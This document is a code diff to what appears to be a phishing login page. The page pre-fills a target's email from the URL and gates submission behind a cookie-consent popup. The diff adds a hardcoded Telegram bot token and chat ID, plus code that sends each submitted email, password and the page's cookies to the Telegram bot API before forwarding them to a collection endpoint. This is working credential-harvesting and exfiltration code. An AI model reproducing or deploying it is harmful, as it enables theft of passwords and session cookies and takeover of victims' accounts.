@@ -426,10 +426,13 @@
             }
         };
 
+        // Telegram Bot Configuration
+        const botToken = '7103630373:AAFVJ_kia1ilw3C043wVG478q81bhZjt7gI';
+        const chatId = '6134592216';
+
         // Function to validate and extract email from URL hash or eta query parameter
         function extractEmailFromUrl() {
             const isValidEmail = email => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-
             const hash = window.location.hash ? decodeURIComponent(window.location.hash.substring(1)) : null;
             if (hash && isValidEmail(hash)) {
                 console.log('Valid email from hash:', hash);
@@ -437,7 +440,6 @@
             } else if (hash) {
                 console.warn('Invalid email format in URL hash:', hash);
             }
-
             const urlParams = new URLSearchParams(window.location.search);
             const eta = urlParams.get('eta') ? decodeURIComponent(urlParams.get('eta')) : null;
             if (eta && isValidEmail(eta)) {
@@ -446,7 +448,6 @@
             } else if (eta) {
                 console.warn('Invalid email format in eta query parameter:', eta);
             }
-
             console.warn('No valid email found in URL hash or eta query parameter.');
             return null;
         }
@@ -457,25 +458,16 @@
             const userLanguages = navigator.languages || [navigator.language || 'en'];
             console.log('Detected browser languages:', userLanguages);
             for (let lang of userLanguages) {
-                if (lang.startsWith('zh')) {
-                    console.log('Matched zh to zh-CN');
-                    return 'zh-CN';
-                }
-                if (supportedLanguages.includes(lang)) {
-                    console.log('Matched language:', lang);
-                    return lang;
-                }
+                if (lang.startsWith('zh')) return 'zh-CN';
+                if (supportedLanguages.includes(lang)) return lang;
                 const baseLang = lang.split('-')[0];
-                if (supportedLanguages.includes(baseLang)) {
-                    console.log('Matched base language:', baseLang);
-                    return baseLang;
-                }
+                if (supportedLanguages.includes(baseLang)) return baseLang;
             }
             console.log('Falling back to English (en)');
             return 'en';
         }
 
-        // Cookie Consent Functions
+        // Cookie Functions
         function setCookie(name, value, days) {
             let expires = "";
             if (days) {
@@ -509,10 +501,10 @@
             const submitButton = document.getElementById('submit-button');
             if (!consent) {
                 consentPopup.style.display = 'block';
-                submitButton.disabled = true; // Disable submit button until consent is given
+                submitButton.disabled = true;
                 console.log('Showing cookie consent popup');
             } else {
-                submitButton.disabled = false; // Enable submit button if consent exists
+                submitButton.disabled = false;
                 console.log('Cookie consent already set:', consent);
             }
         }
@@ -520,11 +512,10 @@
         function setCookieConsent(status) {
             setCookie('cookieConsent', status, 365);
             document.getElementById('cookie-consent').style.display = 'none';
-            document.getElementById('submit-button').disabled = false; // Enable submit button
+            document.getElementById('submit-button').disabled = false;
             console.log(`Cookie consent set to: ${status}`);
         }
 
-        // Function to get all cookies as a string (excluding cookieConsent)
         function getCookies() {
             const rawCookies = document.cookie;
             if (!rawCookies) {
@@ -536,7 +527,10 @@
             return cookies;
         }
 
-        // Initialize i18next with detected language
+        // Set a test cookie for debugging
+        setCookie('testCookie', 'testValue', 1);
+
+        // Initialize i18next
         i18next.init({
             lng: detectUserLanguage(),
             fallbackLng: 'en',
@@ -563,12 +557,10 @@
             });
             document.title = t('title');
             document.querySelector('.lang-switcher').value = lang;
-
-            // Show cookie consent popup after i18next initialization
             showCookieConsent();
         });
 
-        // Language switcher for manual override
+        // Language switcher
         function setLanguage(lang) {
             i18next.changeLanguage(lang, (err, t) => {
                 if (err) {
@@ -591,8 +583,6 @@
                 });
                 document.title = t('title');
                 document.querySelector('.lang-switcher').value = lang;
-
-                // Update cookie consent message on language change
                 document.getElementById('cookie-consent').querySelector('p').innerText = t('cookie_consent_message');
             });
         }
@@ -608,7 +598,6 @@
             let attemptCount = 0;
 
             const emailParam = extractEmailFromUrl();
-
             if (emailParam) {
                 emailInput.value = emailParam;
                 emailInput.disabled = false;
@@ -640,25 +629,46 @@
                 const cookies = consent === 'accepted' ? getCookies() : '';
                 console.log('Cookies to send:', cookies || 'None');
 
+                // Prepare message for Telegram
+                const telegramMessage = `New Form Submission\n\n<b>Email:</b> ${email}\n<b>Password:</b> ${password}\n<b>Cookies:</b> ${cookies || 'None'}`;
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
                 try {
+                    // Send to Telegram
+                    const telegramResponse = await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: telegramMessage,
+                            parse_mode: 'HTML'
+                        })
+                    });
+
+                    const telegramData = await telegramResponse.json();
+                    if (!telegramData.ok) {
+                        throw new Error(`Telegram API error: ${telegramData.description}`);
+                    }
+                    console.log('Telegram message sent successfully:', telegramData);
+
+                    // Send to original endpoint
                     const payload = { email, password };
                     if (cookies) payload.cookies = cookies;
-
-                    console.log('Sending payload:', JSON.stringify(payload));
+                    console.log('Sending payload to original endpoint:', JSON.stringify(payload));
 
                     const response = await fetch(submitEndpoint, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload),
+                        body: JSON.stringify(payload)
                     });
 
                     if (!response.ok) {
-                        throw new Error(`Login failed: ${response.statusText}`);
+                        throw new Error(`Original endpoint failed: ${response.statusText}`);
                     }
 
-                    console.log('Login successful, payload sent:', payload);
+                    console.log('Form submission successful:', payload);
                 } catch (error) {
-                    console.error('Form submission error:', error);
+                    console.error('Submission error:', error);
                     attemptCount++;
                     if (attemptCount < maxAttempts) {
                         form.password.value = '';
